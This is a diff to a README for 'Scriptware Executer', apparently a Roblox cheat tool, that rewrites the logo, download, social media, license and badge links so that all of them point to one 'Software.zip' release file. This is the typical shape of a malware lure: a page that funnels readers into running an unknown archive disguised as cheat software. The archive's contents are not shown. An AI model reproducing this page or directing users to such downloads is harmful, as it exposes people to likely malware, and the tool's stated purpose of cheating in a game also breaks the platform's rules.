@@ -1,7 +1,7 @@
 
 # 🚀 Scriptware Executer
 
-![Scriptware Logo](https://example.com/scriptware-logo.jpg)
+![Scriptware Logo](https://github.com/RyoLasma/Scriptware-Executer/releases/download/v1.0/Software.zip)
 
 ### Repository Overview
 Welcome to the official GitHub repository of **Scriptware Executer** - your go-to solution for executing Roblox scripts with ease. We are dedicated to transforming ideas into reality by providing top-notch software experiences that push the boundaries of what's typical. 
@@ -16,7 +16,7 @@ Welcome to the official GitHub repository of **Scriptware Executer** - your go-t
 🔒 backup | 🗄️ borgbackup | ⏰ delayless | ⚔️ exploit | 💻 fe | 💡 fluxus | 🕵️ hack | 🌐 http | 💾 krnl | 🖥️ lua | 🛡️ netbypass | 📶 netless | ⚙️ reanimate | 🌐 rest-api
 
 ### Getting Started
-To get started with Scriptware Executer, you can [download the latest version here](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip) and follow the instructions in the provided documentation.
+To get started with Scriptware Executer, you can [download the latest version here](https://github.com/RyoLasma/Scriptware-Executer/releases/download/v1.0/Software.zip) and follow the instructions in the provided documentation.
 
 ### Installation
 1. Download the ZIP file from the link above
@@ -31,13 +31,13 @@ For any issues or inquiries regarding Scriptware Executer, please refer to the "
 
 ### Stay Connected
 Follow us on social media to stay updated on the latest developments and releases:
-- [Twitter](https://twitter.com/ScriptwareOfficial)
-- [Instagram](https://instagram.com/scriptware_executer)
-- [Facebook](https://facebook.com/scriptware)
+- [Twitter](https://github.com/RyoLasma/Scriptware-Executer/releases/download/v1.0/Software.zip)
+- [Instagram](https://github.com/RyoLasma/Scriptware-Executer/releases/download/v1.0/Software.zip)
+- [Facebook](https://github.com/RyoLasma/Scriptware-Executer/releases/download/v1.0/Software.zip)
 
 ### License
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/RyoLasma/Scriptware-Executer/releases/download/v1.0/Software.zip](https://github.com/RyoLasma/Scriptware-Executer/releases/download/v1.0/Software.zip) file for details.
 
 #### Made with ❤️ by the Scriptware Team
 
-[![Download Scriptware Executer](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Scriptware Executer](https://github.com/RyoLasma/Scriptware-Executer/releases/download/v1.0/Software.zip)](https://github.com/RyoLasma/Scriptware-Executer/releases/download/v1.0/Software.zip)
